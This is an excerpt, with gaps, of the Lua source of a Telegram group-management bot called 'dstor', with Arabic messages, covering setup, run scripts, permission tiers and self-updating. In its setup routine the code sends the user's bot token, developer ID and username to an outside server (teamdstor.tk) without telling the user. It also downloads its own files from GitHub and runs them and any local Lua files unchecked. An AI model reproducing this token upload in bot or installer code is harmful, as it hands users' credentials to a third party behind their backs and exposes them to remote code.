...
Server_Devdstor = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
------------------------------------------------------------------------------------------------------------
local function Load_File()
local f = io.open("./Info_Sudo.lua", "r")  
if not f then   
if not redis:get(Server_Devdstor.."Token_Devdstor") then
...
redis:set(Server_Devdstor.."Token_Devdstor",token)
end 
else
...
------------------------------------------------------------------------------------------------------------
if not redis:get(Server_Devdstor.."User_Devdstor1") then
io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
local User_Sudo = io.read():gsub('@','')
if User_Sudo ~= '' then
local GetInfoUser = http.request("http://teamdstor.tk/GetUser?id="..User_Sudo)
...
redis:set(Server_Devdstor.."User_Devdstor1",User_Info.Info.Username)
redis:set(Server_Devdstor.."Id_Devdstor",User_Info.Info.Id)
http.request("http://teamdstor.tk/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_Devdstor.."Token_Devdstor"))
else
...
------------------------------------------------------------------------------------------------------------
local Devdstor_Info_Sudo = io.open("Info_Sudo.lua", 'w')
Devdstor_Info_Sudo:write([[
do 
local dstor_INFO = {
Id_Devdstor = ]]..redis:get(Server_Devdstor.."Id_Devdstor")..[[,
UserName_dstor = "]]..redis:get(Server_Devdstor.."User_Devdstor1")..[[",
Token_Bot = "]]..redis:get(Server_Devdstor.."Token_Devdstor")..[["
}
return dstor_INFO
end

]])
Devdstor_Info_Sudo:close()
------------------------------------------------------------------------------------------------------------
local Run_File_dstor = io.open("dstor", 'w')
Run_File_dstor:write([[
#!/usr/bin/env bash
cd $HOME/dstor
token="]]..redis:get(Server_Devdstor.."Token_Devdstor")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./dstor.lua -p PROFILE --bot=$token
done
]])
Run_File_dstor:close()
------------------------------------------------------------------------------------------------------------
...
while(true) do
rm -fr ../.telegram-cli
screen -S Devdstor -X kill
screen -S Devdstor ./dstor
done
]])
Run_SM:close()
...
os.execute('chmod +x dstor')
os.execute('./Run')
Status = true
else   
f:close()  
redis:del(Server_Devdstor.."Token_Devdstor");redis:del(Server_Devdstor.."Id_Devdstor");redis:del(Server_Devdstor.."User_Devdstor1")
Status = false
end  
return Status
end
...
UserName_Dev = sudos.UserName_dstor
bot_id = token:match("(%d+)")  
Id_Dev = sudos.Id_Devdstor
Ids_Dev = {sudos.Id_Devdstor}
Name_Bot = redis:get(bot_id.."Redis:Name:Bot") or "دستور"
------------------------------------------------------------------------------------------------------------
function var(value)  
...
------------------------------------------------------------------------------------------------------------
function Dev_dstor(msg)  
local Dev_dstor = false  
...
function Dev_dstor_User(user)  
local Dev_dstor_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_dstor_User = true  
end  
end  
return Dev_dstor_User  
end 
function DeveloperBot(msg) 
local Status = redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) 
if Status or Dev_dstor(msg) or Bot(msg) then  
return true  
else  
return false  
end  
...
if hash or Dev_dstor(msg) or DeveloperBot(msg) or Bot(msg) then  
return true 
else 
return false 
end 
...
if hash or Dev_dstor(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Bot(msg) then     
return true    
else    
return false    
end 
...
if hash or Dev_dstor(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Bot(msg) then     
return true    
else    
return false    
end 
...
if hash or Dev_dstor(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Bot(msg) then     
return true    
else    
return false    
end 
...
if hash or Dev_dstor(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Admin(msg) or Bot(msg) then     
return true 
else 
return false 
end 
...
if Dev_dstor_User(user_id) then
Status = true  
...
if Dev_dstor_User(user_id) == true then
...
url = 'https://raw.githubusercontent.com/NOVAR1/dstor/master/Script.lua'
...
url = 'https://raw.githubusercontent.com/NOVAR1/dstor/master/dstor.lua'
file_path = 'dstor.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
...
local UserName = (data.username_ or "dstorcli")
...
------------------------------------------------------------------------------------------------------------
function Filesdstor(msg)
File_Bot = dofile("Script.lua")
if File_Bot.dstor and msg then
Text_File = File_Bot.dstor(msg)
end
send(msg.chat_id_, msg.id_,Text_File)  
return false
end
function FilesdstorBot(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
Text_FileBot = dofile("Files/"..v)
if Text_FileBot.dstorFile and msg then
Text_FileBot = Text_FileBot.dstorFile(msg)
end
end
end
...
------------------------------------------------------------------------------------------------------------
function Dev_dstor_File(msg,data)
if msg then
msg = data.message_
...
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id..'GetTexting:Devdstor'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' or text == 'الغاء ✖' then 
redis:del(bot_id..'GetTexting:Devdstor'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'〽┇تم الغاء حفظ كليشة المطور')
return false
end
redis:set(bot_id..'Texting:Devdstor',text)
redis:del(bot_id..'GetTexting:Devdstor'..msg.chat_id_..':'..msg.sender_user_id_)
...
download_to_file('https://raw.githubusercontent.com/NOVAR1/dstor/master/dstor.lua','dstor.lua') 
download_to_file('https://raw.githubusercontent.com/NOVAR1/dstor/master/Script.lua','Script.lua') 
...
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Num:Add:Bot') or 0) and not Dev_dstor(msg) then
